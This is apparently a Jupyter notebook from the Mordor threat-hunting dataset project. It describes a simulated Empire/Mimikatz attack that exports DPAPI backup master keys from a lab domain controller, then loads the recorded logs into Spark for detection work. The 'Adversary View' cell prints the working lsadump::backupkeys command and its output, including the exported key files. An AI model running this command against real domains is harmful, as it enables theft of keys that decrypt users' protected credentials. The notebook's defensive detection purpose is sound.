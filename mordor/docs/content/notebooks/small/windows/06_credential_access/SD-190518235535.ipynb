{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Mimikatz Export Master Key"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190518235535 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/05/18 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_export_master_key.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using tools like Mimikatz to export the master key from the domain controller remotely."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:HFDC01.shire.com /export\n",
    "(Empire: powershell/credentials/mimikatz/command) > execute\n",
    "[*] Tasked 13GK9C5T to run TASK_CMD_JOB\n",
    "[*] Agent 13GK9C5T tasked with task ID 1\n",
    "[*] Tasked agent 13GK9C5T to run module powershell/credentials/mimikatz/command\n",
    "(Empire: powershell/credentials/mimikatz/command) > Job started: DPB5F4\n",
    "Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787\n",
    "\n",
    "  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::backupkeys /system:HFDC01.shire.com /export\n",
    "\n",
    "Current prefered key:       {a1b58ded-16ec-4822-ab1c-3a4cfb9c268a}\n",
    "  * RSA key\n",
    "  Exportable key : YES\n",
    "  Key size       : 2048\n",
    "  Private export : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pvk'\n",
    "  PFX container  : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pfx'\n",
    "  Export         : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.der'\n",
    "\n",
    "Compatibility prefered key: {116228fd-901d-4386-853a-9611c3c93e28}\n",
    "  * Legacy key\n",
    "aff6c7adc1e0ddc685fae1fd657a1f6756df313f9b149f4af78949700de1022f\n",
    "e921157be464fc5cd40ceec73694e565bcab123780f285a5cd678af40cf5f0bb\n",
    "ec9e6b981966d12e5a7de25073fbb716a0e435d1dfee8c55bf5725172161f9d3\n",
    "06f4e00ffa1bc37de63719a7e5173ce20b69dc2764664535435aab7afbc1d332\n",
    "f0c7837839ab891efcb6dc9490746d35aab45efc5e72a7270186ae0260d1ad0f\n",
    "28e5cbe391c9df45dd38e7e5681df55a216a2d50e4de0d8cdd33dde8806569ee\n",
    "fe3e906081c4d1c18e4f42461133a2646fce2a37773ea15bbaae5fef01c0997e\n",
    "f19dcfaf5582ab001056b8fe921c5f5c896f145fef1dfeda8ebe9ef4fd4fccdb\n",
    "\n",
    "  Export         : OK - 'ntds_legacy_0_116228fd-901d-4386-853a-9611c3c93e28.key'\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/command) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_export_master_key.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
